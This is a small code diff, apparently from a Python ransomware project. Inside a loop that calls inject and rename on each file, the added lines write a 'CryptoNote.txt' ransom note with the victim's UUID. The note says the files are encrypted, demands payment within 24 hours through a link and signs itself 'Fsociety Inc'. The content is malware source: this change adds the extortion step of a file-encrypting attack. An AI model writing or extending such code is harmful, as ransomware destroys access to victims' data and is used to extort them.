@@ -33,7 +33,8 @@ def init():
 
                 inject(filename)
                 rename(filename, f_hash)
-
+    with open("CryptoNote.txt", 'w') as note:
+        note.write(str(user_id) + "\n\nHello friend, hello friend...\nYour files are encrypted!\nWant to get them back? Not a problem!\nFollow the link below - \nyouwillnevergetyourfiles.com.net.gov\nEnter your UUID and send us 45BC in the next 24 hours!\nAfter 24 hours your files can not be recovered anymore!\n\nTruly yours,\nFsociety Inc\n")
 
 
 def rename(filename, f_hash):
